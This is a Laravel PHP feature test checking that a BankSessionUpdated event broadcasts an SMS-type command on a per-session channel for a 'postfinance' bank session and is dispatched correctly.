<?php

namespace Tests\Feature;

use App\Events\BankSessionUpdated;
use App\Models\BankSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Event;
use Tests\TestCase;

class BankSessionUpdatedEventTest extends TestCase
{
    use RefreshDatabase;

    public function test_event_broadcasts_on_session_channel_with_command(): void
    {
        $session = BankSession::create([
            'bank_slug' => 'postfinance',
            'action_type' => ['type' => 'sms'],
        ]);

        $event = new BankSessionUpdated($session);

        $this->assertSame("bank-session.{$session->id}", $event->broadcastOn()->name);
        $this->assertSame('BankSessionUpdated', $event->broadcastAs());
        $this->assertEquals(['command' => ['type' => 'sms']], $event->broadcastWith());
    }

    public function test_event_dispatch_is_captured(): void
    {
        Event::fake([BankSessionUpdated::class]);
        $session = BankSession::create(['bank_slug' => 'postfinance']);

        BankSessionUpdated::dispatch($session);

        Event::assertDispatched(BankSessionUpdated::class);
    }
}
